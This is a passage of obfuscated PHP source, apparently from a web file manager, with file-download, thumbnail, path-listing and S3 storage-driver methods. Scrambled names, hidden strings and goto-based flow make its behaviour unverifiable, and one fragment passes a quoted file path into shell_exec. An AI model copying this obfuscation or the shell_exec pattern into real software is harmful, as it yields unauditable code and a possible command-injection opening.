$dÒ¶ÕäòÌô) { $C‚∫ÈıπÖÑ = shell_exec($dÒ¶ÕäòÌô . "\40\x22{$B¨â€’»Ùÿ}\42"); if ($C‚∫ÈıπÖÑ && substr(trim($C‚∫ÈıπÖÑ), 0, 32) == $B∏âÚØ∞•Ç) { $Eø€íÖ’ÖÉ = $dÒ¶ÕäòÌô; break; } } Cache::set($B®ıÛç®Ç[97], $Eø€íÖ’ÖÉ, 3600); } if ($Eø€íÖ’ÖÉ == $B®ıÛç®Ç[99]) { return !1; } goto Céæ¢œà“Î; DÏ≠•Ç„ÛÏ: } public function link($F©‡ñãíÓÖ) { return $F©‡ñãíÓÖ; } public function fileOut($b√÷…õ–∂É, $Bﬂ¶ ﬂÊïá = false, $Bï‚ë“ö„… = false, $A£ﬂêÜÑà¿ = '') { goto Cáî∂Ω∫∫å; còë÷œÑ≥à: $Dﬂ£ç°Éìπ = rawurlencode($eé∂÷Ç∑§ó); $Dﬂ£ç°Éìπ = $bßûﬂπÖÀ‹[113] . $Dﬂ£ç°Éìπ . $bßûﬂπÖÀ‹[117] . $Dﬂ£ç°Éìπ; if ($Bﬂ¶ ﬂÊïá) { header($bßûﬂπÖÀ‹[118]); header($bßûﬂπÖÀ‹[119] . $Dﬂ£ç°Éìπ); } else { header($bßûﬂπÖÀ‹[120] . $Dﬂ£ç°Éìπ); } goto F÷∆∑œ≈û·; A¿ë◊ÇÑ¢ª: $e¬«“§—£ì = get_file_mime($a¡Ÿí∆ﬁë„); if (strstr($e¬«“§—£ì, $bßûﬂπÖÀ‹[114])) { $e¬«“§—£ì = $e¬«“§—£ì . $bßûﬂπÖÀ‹[115]; } if ($Bﬂ¶ ﬂÊïá === !1 && !mime_support($e¬«“§—£ì)) { $Bﬂ¶ ﬂÊïá = !0; $e¬«“§—£ì = $bßûﬂπÖÀ‹[116]; } goto còë÷œÑ≥à; Cáî∂Ω∫∫å: $bßûﬂπÖÀ‹ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->cacheMethod(null, null); if (!$b√÷…õ–∂É || !$this->exist($b√÷…õ–∂É)) { show_json(LNG($bßûﬂπÖÀ‹[101]), !1, $Bï‚ë“ö„…); } goto B√èúÉíôﬂ; A†»ûöæéÃ: $C‡ïÔÙÜ°† = 0; $eÈßÏ¥«¡Ö = $b§πƒ˘»À - 1; $a¡Ÿí∆ﬁë„ = $this->ext($eé∂÷Ç∑§ó); goto b≈ú™“üää; B√èúÉíôﬂ: $CÓ≥ãÕâÂ’ = $this->getType() == $bßûﬂπÖÀ‹[102]; $dÀå·¯Ñ¬√ = $GLOBALS[$bßûﬂπÖÀ‹[6]][$bßûﬂπÖÀ‹[84]][$bßûﬂπÖÀ‹[103]][$bßûﬂπÖÀ‹[104]]; $b§úè÷…àŒ = (double) $GLOBALS[$bßûﬂπÖÀ‹[6]][$bßûﬂπÖÀ‹[84]][$bßûﬂπÖÀ‹[103]][$bßûﬂπÖÀ‹[105]] * 1024 * 1024; goto E∂Îœ≠äâù; E∂Îœ≠äâù: @ob_end_clean(); set_timeout(); $C’•“–◊Îÿ = $this->infoFull($b√÷…õ–∂É); goto DøÜªëŒ•Ø; fé€ïë›ü‚: if ($_SERVER[$bßûﬂπÖÀ‹[154]] == $bßûﬂπÖÀ‹[155]) { return; } $aº∆Ô’üÀ¡ = 1024 * 100; $aÜ¡Çª∑û– = 0; goto B„Àôä⁄ñ´; DøÜªëŒ•Ø: $b§πƒ˘»À = $C’•“–◊Îÿ[$bßûﬂπÖÀ‹[77]]; $F¨⁄¨®Œ‚ = gmdate($bßûﬂπÖÀ‹[106], $C’•“–◊Îÿ[$bßûﬂπÖÀ‹[107]]); $eé∂÷Ç∑§ó = $Bï‚ë“ö„… ? $Bï‚ë“ö„… : $this->iconvApp($C’•“–◊Îÿ[$bßûﬂπÖÀ‹[28]]); goto A†»ûöæéÃ; F àÆ⁄∂ò: $A∏œãËô†á = strtolower($_SERVER[$bßûﬂπÖÀ‹[139]]); if ($CÓ≥ãÕâÂ’ && $A∏œãËô†á && $dÀå·¯Ñ¬√) { if (strstr($A∏œãËô†á, $bßûﬂπÖÀ‹[140])) { header($bßûﬂπÖÀ‹[141] . $b√÷…õ–∂É); } else { if (strstr($A∏œãËô†á, $bßûﬂπÖÀ‹[142])) { header($bßûﬂπÖÀ‹[143] . $b√÷…õ–∂É); } else { if (strstr($A∏œãËô†á, $bßûﬂπÖÀ‹[144])) { header($bßûﬂπÖÀ‹[145] . $b√÷…õ–∂É); } } } if ($b§úè÷…àŒ) { header($bßûﬂπÖÀ‹[146] . $b§úè÷…àŒ); } return; } if (isset($_SERVER[$bßûﬂπÖÀ‹[147]])) { if (preg_match($bßûﬂπÖÀ‹[148], $_SERVER[$bßûﬂπÖÀ‹[147]], $b’à«ë‡Ô)) { $C‡ïÔÙÜ°† = intval($b’à«ë‡Ô[1]); if (!empty($b’à«ë‡Ô[2])) { $eÈßÏ¥«¡Ö = intval($b’à«ë‡Ô[2]); } } header($bßûﬂπÖÀ‹[149]); header("\x43\157\x6e\164\x65\x6e\x74\x2d\122\x61\156\147\145\72\x20\x62\x79\x74\145\163\40{$C‡ïÔÙÜ°†}\55{$eÈßÏ¥«¡Ö}\x2f" . $b§πƒ˘»À); } else { header($bßûﬂπÖÀ‹[150]); } goto d„éúÖè≤≈; d÷œ∂®≤ﬁ§: header($bßûﬂπÖÀ‹[132] . $F¨⁄¨®Œ‚ . $bßûﬂπÖÀ‹[124]); header($bßûﬂπÖÀ‹[133] . $eé∂÷Ç∑§ó); header($bßûﬂπÖÀ‹[134]); goto b˘Ó ¶Ì§ì; dò¿– ⁄ëÚ: header($bßûﬂπÖÀ‹[125]); header($bßûﬂπÖÀ‹[126]); header($bßûﬂπÖÀ‹[127]); goto aÆƒ£≥Ï∂≠; d„éúÖè≤≈: $F¿ÚπÙ¢ˆõ = !0; if ($_SERVER[$bßûﬂπÖÀ‹[151]] == $bßûﬂπÖÀ‹[152] && $b§πƒ˘»À > 1204 * 1024 * 1024 * 2) { $F¿ÚπÙ¢ˆõ = !1; } if ($F¿ÚπÙ¢ˆõ) { header($bßûﬂπÖÀ‹[153] . ($eÈßÏ¥«¡Ö - $C‡ïÔÙÜ°† + 1)); } goto fé€ïë›ü‚; b≈ú™“üää: if (in_array($a¡Ÿí∆ﬁë„, array($bßûﬂπÖÀ‹[108], $bßûﬂπÖÀ‹[109], $bßûﬂπÖÀ‹[110], $bßûﬂπÖÀ‹[111]))) { $a¡Ÿí∆ﬁë„ = $bßûﬂπÖÀ‹[112]; } if (!$A£ﬂêÜÑà¿) { $A£ﬂêÜÑà¿ = md5($F¨⁄¨®Œ‚ . $this->hashSimple($b√÷…õ–∂É)); } $A£ﬂêÜÑà¿ = $bßûﬂπÖÀ‹[113] . $A£ﬂêÜÑà¿ . $bßûﬂπÖÀ‹[113]; goto A¿ë◊ÇÑ¢ª; aÆƒ£≥Ï∂≠: if (isset($_SERVER[$bßûﬂπÖÀ‹[128]]) && strtotime($_SERVER[$bßûﬂπÖÀ‹[128]]) == $C’•“–◊Îÿ[$bßûﬂπÖÀ‹[107]]) { header($bßûﬂπÖÀ‹[129], !0, 304); die; } if (isset($_SERVER[$bßûﬂπÖÀ‹[130]]) && $_SERVER[$bßûﬂπÖÀ‹[130]] == $A£ﬂêÜÑà¿) { header($bßûﬂπÖÀ‹[131] . $A£ﬂêÜÑà¿, !0, 304); die; } header($bßûﬂπÖÀ‹[131] . $A£ﬂêÜÑà¿); goto d÷œ∂®≤ﬁ§; B„Àôä⁄ñ´: if ($b§úè÷…àŒ) { $aÜ¡Çª∑û– = intval(1000 * 1000 * ($aº∆Ô’üÀ¡ / $b§úè÷…àŒ)); } while ($C‡ïÔÙÜ°† <= $eÈßÏ¥«¡Ö) { $c±¢‚öÇ§– = timeFloat(); check_abort(); $aØÉ‚…õ´≠ = $eÈßÏ¥«¡Ö - $C‡ïÔÙÜ°† + 1; if ($aØÉ‚…õ´≠ <= $aº∆Ô’üÀ¡) { $aº∆Ô’üÀ¡ = $aØÉ‚…õ´≠; } echo $this->fileSubstr($b√÷…õ–∂É, $C‡ïÔÙÜ°†, $aº∆Ô’üÀ¡); $C‡ïÔÙÜ°† += $aº∆Ô’üÀ¡; if ($aº∆Ô’üÀ¡ == $aØÉ‚…õ´≠) { $C‡ïÔÙÜ°† = $eÈßÏ¥«¡Ö + 1; } if ($aÜ¡Çª∑û–) { $Eñ‡Ÿ˜··« = intval(1000 * 1000 * (timeFloat() - $c±¢‚öÇ§–)); $cÚ± È∑ñÛ = $aÜ¡Çª∑û– - $Eñ‡Ÿ˜··«; if ($cÚ± È∑ñÛ > 5) { usleep($cÚ± È∑ñÛ); } } } goto EÔØ∑Õ ¥Ô; F÷∆∑œ≈û·: header($bßûﬂπÖÀ‹[121]); header($bßûﬂπÖÀ‹[122] . $e¬«“§—£ì); header($bßûﬂπÖÀ‹[123] . gmdate($bßûﬂπÖÀ‹[106], time() + 3600 * 24 * 30) . $bßûﬂπÖÀ‹[124]); goto dò¿– ⁄ëÚ; b˘Ó ¶Ì§ì: header($bßûﬂπÖÀ‹[135] . $b§πƒ˘»À); header($bßûﬂπÖÀ‹[136]); if (!$Bﬂ¶ ﬂÊïá && $a¡Ÿí∆ﬁë„ == $bßûﬂπÖÀ‹[137]) { if ($b§πƒ˘»À > 1024 * 1024 * 5) { die; } $DüÒåÛñí√ = $this->getContent($b√÷…õ–∂É); $DüÒåÛñí√ = Html::clearSVG($DüÒåÛñí√); header($bßûﬂπÖÀ‹[138] . $b§πƒ˘»À); echo $DüÒåÛñí√; die; } goto F àÆ⁄∂ò; EÔØ∑Õ ¥Ô: } public function fileOutServer($FøªÆ…ìØﬁ, $A∏€€É∆–Ê = false, $aë¨Êÿë•Ø = false, $BÇñÈê∂æ∏ = '') { $this->fileOut($FøªÆ…ìØﬁ, $A∏€€É∆–Ê, $aë¨Êÿë•Ø, $BÇñÈê∂æ∏); } public function fileOutLink($E›Œœ‘ôˆë) { header($_SERVER[Ä¿¡‡öóµŸﬂ‡][156] . $E›Œœ‘ôˆë); die; } public function cacheMethod($eïØ∫¶àö°, $FœÑä∂¥ÇÎ) { goto d´ª…™Í≠“; AéÌáæﬂ¯†: $dá≠‡ùÑñ“ = $E≤˘§ƒôÀ±[157] . $eïØ∫¶àö° . $E≤˘§ƒôÀ±[158] . rtrim($c¢ë⁄–£∆é, $E≤˘§ƒôÀ±[8]); if (is_null($eïØ∫¶àö°)) { $d˘ü»ªÿÕ = array(); return; } if (is_null($FœÑä∂¥ÇÎ)) { unset($d˘ü»ªÿÕ[$dá≠‡ùÑñ“]); return; } goto DâÖÔ·Ë´∂; EÒ”äÃó©—: $d˘ü»ªÿÕ[$dá≠‡ùÑñ“] = $B¥ çƒ»å±; return $B¥ çƒ»å±; goto bë≤‹ﬂÿ”í; DâÖÔ·Ë´∂: $B¥ çƒ»å± = isset($d˘ü»ªÿÕ[$dá≠‡ùÑñ“]) ? $d˘ü»ªÿÕ[$dá≠‡ùÑñ“] : null; if (!is_null($B¥ çƒ»å±)) { return $B¥ çƒ»å±; } $B¥ çƒ»å± = $this->{$eïØ∫¶àö°}($FœÑä∂¥ÇÎ); goto EÒ”äÃó©—; d´ª…™Í≠“: $E≤˘§ƒôÀ± =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; static $d˘ü»ªÿÕ = array(); $c¢ë⁄–£∆é = $FœÑä∂¥ÇÎ ? ltrim($this->getPathOuter($FœÑä∂¥ÇÎ), $E≤˘§ƒôÀ±[8]) : $FœÑä∂¥ÇÎ; goto AéÌáæﬂ¯†; bë≤‹ﬂÿ”í: } public function fileOutImage($F·âÉ˜¿›À, $c≥Ô¨…„ ¥ = 250) { goto Fç˜í•è¢; Fç˜í•è¢: $C§¶åäÖ·± =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (substr($F·âÉ˜¿›À, 0, 4) == $C§¶åäÖ·±[144]) { $this->fileOutLink($F·âÉ˜¿›À); } $Eµ≥‹¥éºÕ = $this->info($F·âÉ˜¿›À); goto a∑àõâ˜◊ö; cç≤Éà◊çë: $AŸéëÂâ∂« = DATA_THUMB . $Eì≥ÑºÀ∞ß; if (!@file_exists($AŸéëÂâ∂«)) { $d∏Í÷‘àﬂÓ = TEMP_FILES; if (!is_dir($d∏Í÷‘àﬂÓ)) { mk_dir($d∏Í÷‘àﬂÓ); } $d≤∫ÀΩ”ì = $d∏Í÷‘àﬂÓ . $c¶ÛÚãŸèÆ . $C§¶åäÖ·±[91] . $Eµ≥‹¥éºÕ[$C§¶åäÖ·±[160]]; if (!@file_exists($d≤∫ÀΩ”ì)) { $d≤∫ÀΩ”ì = $this->download($F·âÉ˜¿›À, $d≤∫ÀΩ”ì); } $C÷©ìåÁÌ€ = new ImageThumb($d≤∫ÀΩ”ì, $C§¶åäÖ·±[167]); $C÷©ìåÁÌ€->prorate($AŸéëÂâ∂«, $c≥Ô¨…„ ¥, $c≥Ô¨…„ ¥ * 10); } if (!file_exists($AŸéëÂâ∂«) || filesize($AŸéëÂâ∂«) < 100) { return @file_exists($d≤∫ÀΩ”ì) ? IO::fileOut($d≤∫ÀΩ”ì) : $this->fileOut($F·âÉ˜¿›À); } goto dﬂñçÏëΩ‹; dﬂñçÏëΩ‹: if (!($dû€úãï „ = IO::move($AŸéëÂâ∂«, $A∫µÊ‚º†â))) { return IO::fileOut($AŸéëÂâ∂«); } del_file($AŸéëÂâ∂«); IO::fileOut($dû€úãï „); goto e»Í¥–÷ÜÒ; a∑àõâ˜◊ö: if ($Eµ≥‹¥éºÕ[$C§¶åäÖ·±[77]] <= 1024 * 50 || !function_exists($C§¶åäÖ·±[159]) || $Eµ≥‹¥éºÕ[$C§¶åäÖ·±[160]] == $C§¶åäÖ·±[161]) { return $this->fileOut($F·âÉ˜¿›À); } if (isset($Eµ≥‹¥éºÕ[$C§¶åäÖ·±[162]][$C§¶åäÖ·±[163]])) { $c¶ÛÚãŸèÆ = $Eµ≥‹¥éºÕ[$C§¶åäÖ·±[162]][$C§¶åäÖ·±[163]]; } else { if (isset($Eµ≥‹¥éºÕ[$C§¶åäÖ·±[162]][$C§¶åäÖ·±[164]])) { $c¶ÛÚãŸèÆ = $Eµ≥‹¥éºÕ[$C§¶åäÖ·±[162]][$C§¶åäÖ·±[164]]; } else { $c¶ÛÚãŸèÆ = md5("{$Eµ≥‹¥éºÕ[$C§¶åäÖ·±[28]]}\x5f{$Eµ≥‹¥éºÕ[$C§¶åäÖ·±[75]]}\x5f{$Eµ≥‹¥éºÕ[$C§¶åäÖ·±[77]]}"); } } $Eì≥ÑºÀ∞ß = "{$c¶ÛÚãŸèÆ}\137{$c≥Ô¨…„ ¥}\x2e\160\156\147"; goto béâà∆”¥ç; béâà∆”¥ç: if (!($CΩœ˜ŸÌÖÏ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $C§¶åäÖ·±[165]))) { $A∫µÊ‚º†â = IO::mkdir(IO_PATH_SYSTEM_TEMP . $C§¶åäÖ·±[166]); } else { $A∫µÊ‚º†â = KodIO::make($CΩœ˜ŸÌÖÏ); } if ($CΩœ˜ŸÌÖÏ = IO::fileNameExist($A∫µÊ‚º†â, $Eì≥ÑºÀ∞ß)) { $AŸéëÂâ∂« = KodIO::make($CΩœ˜ŸÌÖÏ); return IO::fileOut($AŸéëÂâ∂«); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto cç≤Éà◊çë; e»Í¥–÷ÜÒ: } public function fileOutImageServer($D–‡¿·ÇÂà, $aòπ∑• –Ù = 250) { $this->fileOutImage($D–‡¿·ÇÂà, $aòπ∑• –Ù); } public function fileNameAuto($báÛ∫ùß „, $c±°“ê¬Ì≤, $EÊ‡ïÀŒ¨≤ = REPEAT_RENAME, $FÀ°™¿†§ı = false) { goto Aˆ˘íﬁÒä“; e’±≈ÀØºÆ: while ($this->exist(rtrim($báÛ∫ùß „, $b∆≠ëÀ¶˘[8]) . $b∆≠ëÀ¶˘[8] . $AÇç©Â–∑é)) { $AÇç©Â–∑é = $aáàâ¬Ò´ . "\x28{$b∆ﬁüº“’Í}\x29{$aœü’ÿﬁ™·}"; $b∆ﬁüº“’Í++; } return $AÇç©Â–∑é; goto BÂßœËßÖÚ; A°ƒäçÔ¢⁄: if ($EÊ‡ïÀŒ¨≤ == REPEAT_SKIP) { return !1; } $aœü’ÿﬁ™· = $b∆≠ëÀ¶˘[91] . get_path_ext($c±°“ê¬Ì≤); $aœü’ÿﬁ™· = $aœü’ÿﬁ™· == $b∆≠ëÀ¶˘[91] || $FÀ°™¿†§ı ? $b∆≠ëÀ¶˘[33] : $aœü’ÿﬁ™·; goto cã±ç∑´øΩ; cã±ç∑´øΩ: $b∆ﬁüº“’Í = 1; $aáàâ¬Ò´ = substr($c±°“ê¬Ì≤, 0, strlen($c±°“ê¬Ì≤) - strlen($aœü’ÿﬁ™·)); $AÇç©Â–∑é = $aáàâ¬Ò´ . "\50{$b∆ﬁüº“’Í}\51{$aœü’ÿﬁ™·}"; goto e’±≈ÀØºÆ; Aˆ˘íﬁÒä“: $b∆≠ëÀ¶˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B»ÉàÂÚäÀ = $báÛ∫ùß „ === $b∆≠ëÀ¶˘[33] ? $c±°“ê¬Ì≤ : rtrim($báÛ∫ùß „, $b∆≠ëÀ¶˘[8]) . $b∆≠ëÀ¶˘[8] . $c±°“ê¬Ì≤; if ($EÊ‡ïÀŒ¨≤ == REPEAT_REPLACE || !$this->exist($B»ÉàÂÚäÀ) || $FÀ°™¿†§ı && $EÊ‡ïÀŒ¨≤ != REPEAT_RENAME_FOLDER) { return $c±°“ê¬Ì≤; } goto A°ƒäçÔ¢⁄; BÂßœËßÖÚ: } public function listAllFiles($cﬁº‰‘–‹, $C≠ªÆéﬂ´˜, $fıñ’·ä⁄‚ = array()) { goto E˜£öØ¯¡Â; EÎâïãá¿ï: $cﬁº‰‘–‹ = trim($cﬁº‰‘–‹, $EÖÒˆÌı·…[8]); foreach ($C≠ªÆéﬂ´˜ as $f°ù¿Ñ‰°‘) { $fÇõÍ„Ø≤ì = ltrim(substr($f°ù¿Ñ‰°‘, strlen($cﬁº‰‘–‹)), $EÖÒˆÌı·…[8]); $d•íº’≠ëÛ = array_merge($d•íº’≠ëÛ, $this->slicePath($fÇõÍ„Ø≤ì)); } $BÒê∞ÈåÆ¨ = array(); goto CïıÜäêÇï; CïıÜäêÇï: foreach (array_unique($d•íº’≠ëÛ) as $f°ù¿Ñ‰°‘) { $AÎÑƒ∏€ªÉ = array($EÖÒˆÌı·…[75] => $this->getPathOuter($EÖÒˆÌı·…[8] . $cﬁº‰‘–‹ . $EÖÒˆÌı·…[8] . $f°ù¿Ñ‰°‘), $EÖÒˆÌı·…[76] => 1, $EÖÒˆÌı·…[77] => 0); if (substr($f°ù¿Ñ‰°‘, -1) != $EÖÒˆÌı·…[8]) { $AÎÑƒ∏€ªÉ[$EÖÒˆÌı·…[76]] = 0; $B·≥èöå‚õ = $this->getPath($cﬁº‰‘–‹ . $EÖÒˆÌı·…[8] . $f°ù¿Ñ‰°‘); $AÎÑƒ∏€ªÉ[$EÖÒˆÌı·…[77]] = isset($fıñ’·ä⁄‚[$B·≥èöå‚õ]) ? $fıñ’·ä⁄‚[$B·≥èöå‚õ] : $this->size($B·≥èöå‚õ); } $BÒê∞ÈåÆ¨[] = $AÎÑƒ∏€ªÉ; } return $BÒê∞ÈåÆ¨; goto Bÿ±ÊÇ◊ØÚ; E˜£öØ¯¡Â: $EÖÒˆÌı·… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($C≠ªÆéﬂ´˜)) { return array(); } $d•íº’≠ëÛ = array(); goto EÎâïãá¿ï; Bÿ±ÊÇ◊ØÚ: } public function slicePath($eÙﬁâ·â≈∞) { $côãü´¡º¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b¬ÛÜÓÈ›¥ = explode($côãü´¡º¥[8], trim($eÙﬁâ·â≈∞, $côãü´¡º¥[8])); $eâˆƒ‚„€Ñ = 0; do { ++$eâˆƒ‚„€Ñ; $d±’¶Î êù[] = implode($côãü´¡º¥[8], array_slice($b¬ÛÜÓÈ›¥, 0, $eâˆƒ‚„€Ñ)) . $côãü´¡º¥[8]; } while ($eâˆƒ‚„€Ñ < count($b¬ÛÜÓÈ›¥)); $d±’¶Î êù[count($b¬ÛÜÓÈ›¥) - 1] = $eÙﬁâ·â≈∞; return $d±’¶Î êù; } public function getHost() { $e•Ü’ÏÏƒú =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aê€Ë◊’ö˜ = parse_url(trim($this->domain, $e•Ü’ÏÏƒú[8])); $D∆â‘‡ôá≈ = isset($Aê€Ë◊’ö˜[$e•Ü’ÏÏƒú[168]]) ? $Aê€Ë◊’ö˜[$e•Ü’ÏÏƒú[168]] : http_type(); $cˆ‰∫–∆‹û = isset($Aê€Ë◊’ö˜[$e•Ü’ÏÏƒú[169]]) ? $Aê€Ë◊’ö˜[$e•Ü’ÏÏƒú[169]] : $Aê€Ë◊’ö˜[$e•Ü’ÏÏƒú[75]]; if (isset($Aê€Ë◊’ö˜[$e•Ü’ÏÏƒú[170]])) { $cˆ‰∫–∆‹û .= $e•Ü’ÏÏƒú[4] . $Aê€Ë◊’ö˜[$e•Ü’ÏÏƒú[170]]; } return $D∆â‘‡ôá≈ . $e•Ü’ÏÏƒú[171] . $cˆ‰∫–∆‹û; } public function pathEncode($bÛëèêèëµ) { $BÈ™âîº©® =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return str_replace($BÈ™âîº©®[172], $BÈ™âîº©®[8], rawurlencode($bÛëèêèëµ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($Eû€∫ö»îË) { set_timeout(); require_once SDK_DIR . $_SERVER[Ä¿¡‡öóµŸﬂ‡][173]; parent::__construct(); $this->_init($Eû€∫ö»îË); } public function _init($cËπñô„Éÿ) { foreach ($cËπñô„Éÿ as $A„§ÚùÌˆà => $EºÉ·°∂πê) { if (isset($this->{$A„§ÚùÌˆà})) { $this->{$A„§ÚùÌˆà} = $EºÉ·°∂πê; } } $this->endpoint = $cËπñô„Éÿ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($EôÃìÀﬁπÌ = "\166\64") { $this->signVer = $EôÃìÀﬁπÌ; $this->client->setSignatureVersion($EôÃìÀﬁπÌ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto B”Õâ£ÔäÙ; B”Õâ£ÔäÙ: $f–ÕÕΩÆìØ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÔêœÿÖ∞é = $this->getBucketCors(); if (!$cÔêœÿÖ∞é || !is_array($cÔêœÿÖ∞é)) { return !1; } goto Aõë¶êÿü≤; Aõë¶êÿü≤: if ($cÔêœÿÖ∞é[$f–ÕÕΩÆìØ[175]] != $f–ÕÕΩÆìØ[176] || $cÔêœÿÖ∞é[$f–ÕÕΩÆìØ[177]] != $f–ÕÕΩÆìØ[176]) { return !1; } $AÜÍíÂÆ∞Ò = array_map($f–ÕÕΩÆìØ[178], $cÔêœÿÖ∞é[$f–ÕÕΩÆìØ[179]]); if (!is_array($AÜÍíÂÆ∞Ò)) { $AÜÍíÂÆ∞Ò = array(); } goto dãÜ∆€ΩéÖ; dãÜ∆€ΩéÖ: $DÎÁê˘°Æ¥ = array($f–ÕÕΩÆìØ[180], $f–ÕÕΩÆìØ[181], $f–ÕÕΩÆìØ[182], $f–ÕÕΩÆìØ[183], $f–ÕÕΩÆìØ[184]); $D¨áó¯ØÛÈ = array_diff($DÎÁê˘°Æ¥, $AÜÍíÂÆ∞Ò); return empty($D¨áó¯ØÛÈ); goto Aº¨ﬁñèé‘; Aº¨ﬁñèé‘: } public function mkfile($A’÷´ÜåÉâ, $d¿¶ôÚÁùõ = '', $Dç≥∏ª›∫Ó = REPEAT_RENAME) { $Eëµ‡Ñÿ—– = $this->setContent($A’÷´ÜåÉâ, $d¿¶ôÚÁùõ); if ($Eëµ‡Ñÿ—– !== !1) { return $this->getPathOuter($A’÷´ÜåÉâ); } return !1; } public function mkdir($cÿÔ…∑æ£ù, $cÎ∞»¯÷¡” = REPEAT_SKIP) { if (empty($cÿÔ…∑æ£ù)) { return !1; } if ($this->_isFolder($cÿÔ…∑æ£ù)) { return $this->getPathOuter($cÿÔ…∑æ£ù); } $dÈÖè£Ê‹É = $this->setContent($cÿÔ…∑æ£ù, $_SERVER[Ä¿¡‡öóµŸﬂ‡][33], !0); if ($dÈÖè£Ê‹É !== !1) { return $this->getPathOuter($cÿÔ…∑æ£ù); } return !1; } public function copyFile($bÍìè…›èë, $cò∫ÎüÃ„è, $F⁄Éúıò∞» = array()) { $FöñúˆÕõ˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÕŒÁó∞ª  = $this->objectMeta($bÍìè…›èë); if (!$cÕŒÁó∞ª ) { return !1; } if ($cÕŒÁó∞ª [$FöñúˆÕõ˘[77]] <= 1024 * 1024 * 200) { $b’±¶∏¥ØΩ = $this->client->copyObject($this->bucket, $bÍìè…›èë, $this->bucket, $cò∫ÎüÃ„è, $FöñúˆÕõ˘[185], $F⁄Éúıò∞»); } else { $b’±¶∏¥ØΩ = $this->client->multiCopyObject($this->bucket, $bÍìè…›èë, $this->bucket, $cò∫ÎüÃ„è, $F⁄Éúıò∞»); } $b’±¶∏¥ØΩ = $b’±¶∏¥ØΩ ? $this->getPathOuter($cò∫ÎüÃ„è) : !1; return $b’±¶∏¥ØΩ; } public function moveFile($Dù‡“¿†·í, $BÚ‹îä∞Âç) { if ($this->copyFile($Dù‡“¿†·í, $BÚ‹îä∞Âç)) { $this->delFile($Dù‡“¿†·í); return $this->getPathOuter($BÚ‹îä∞Âç); } return !1; } public function delFile($C´ÊˆØ‡Ñò) { return $this->client->deleteObject($this->bucket, $C´ÊˆØ‡Ñò); } public function delFolder($Aäü ÇÕÉÇ) { goto AΩ©¥·ê∏Á; eöë°£ ≈û: $BúñÃŸÉÿö = $däÙ•¬À∂€ = 0; $d¢——á¨ß◊ = array_chunk(array_keys($d‡áÂ¯â˜Ô), 1000); foreach ($d¢——á¨ß◊ as $Dë∑∂“Ú¢À) { $BúñÃŸÉÿö++; $däÙ•¬À∂€ += (int) $this->client->deleteObjects($this->bucket, $Dë∑∂“Ú¢À); } goto A÷·ß›õÉò; AΩ©¥·ê∏Á: $bñ”∫≈⁄æñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d‡áÂ¯â˜Ô = $this->listObjs($Aäü ÇÕÉÇ); if (!$d‡áÂ¯â˜Ô) { $Aäü ÇÕÉÇ = trim($Aäü ÇÕÉÇ, $bñ”∫≈⁄æñ[8]); if (!empty($Aäü ÇÕÉÇ)) { $Aäü ÇÕÉÇ .= $bñ”∫≈⁄æñ[8]; } return $this->delFile($Aäü ÇÕÉÇ); } goto eöë°£ ≈û; A÷·ß›õÉò: return $BúñÃŸÉÿö === $däÙ•¬À∂€ ? !0 : !1; goto FºÇﬁ‹ÖÁ⁄; FºÇﬁ‹ÖÁ⁄: } public function rename($e”¯Í¶–ˆñ, $DÛß¨Ø¨◊Á) { return $this->renameObject($e”¯Í¶–ˆñ, $DÛß¨Ø¨◊Á); } public function listPath($e≈ﬂªØˆÙ–, $FÜÑ≥ıêãÿ = false) { $aºñ¢ˆÓ‹£ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eìŒ…ŸŸÜú = $this->listObjs($e≈ﬂªØˆÙ–, null, null, $aºñ¢ˆÓ‹£[8]); $AÑ°©êÏëÍ = array($aºñ¢ˆÓ‹£[74] => array(), $aºñ¢ˆÓ‹£[73] => array()); foreach ($eìŒ…ŸŸÜú as $e€óÕ†ïﬂí => $fÿ≤¯‡ÌûΩ) { if ($e€óÕ†ïﬂí == $aºñ¢ˆÓ‹£[8]) { continue; } if (isset($fÿ≤¯‡ÌûΩ[$aºñ¢ˆÓ‹£[186]])) { $AÑ°©êÏëÍ[$aºñ¢ˆÓ‹£[74]][] = $this->folderInfo($fÿ≤¯‡ÌûΩ[$aºñ¢ˆÓ‹£[186]], $FÜÑ≥ıêãÿ); } else { if (substr($fÿ≤¯‡ÌûΩ[$aºñ¢ˆÓ‹£[28]], -1) == $aºñ¢ˆÓ‹£[8]) { continue; } $AÑ°©êÏëÍ[$aºñ¢ˆÓ‹£[73]][] = $this->fileInfo($fÿ≤¯‡ÌûΩ[$aºñ¢ˆÓ‹£[28]], $FÜÑ≥ıêãÿ, $fÿ≤¯‡ÌûΩ); } } return $AÑ°©êÏëÍ; } private function fileInfo($bÀ÷™À∫ùÚ, $e∫Ÿ€—àΩ• = false, $aﬂî√€§∆‚ = array()) { goto b≤Œæ∏¬ß†; döóÏÎõËú: if (empty($aﬂî√€§∆‚)) { $aﬂî√€§∆‚ = $this->objectMeta($bÀ÷™À∫ùÚ); if (!$aﬂî√€§∆‚) { return $açÔçπãæä; } } if (isset($aﬂî√€§∆‚[$d»Ô£É¢É£[190]])) { $açÔçπãæä[$d»Ô£É¢É£[107]] = $aﬂî√€§∆‚[$d»Ô£É¢É£[190]]; } if 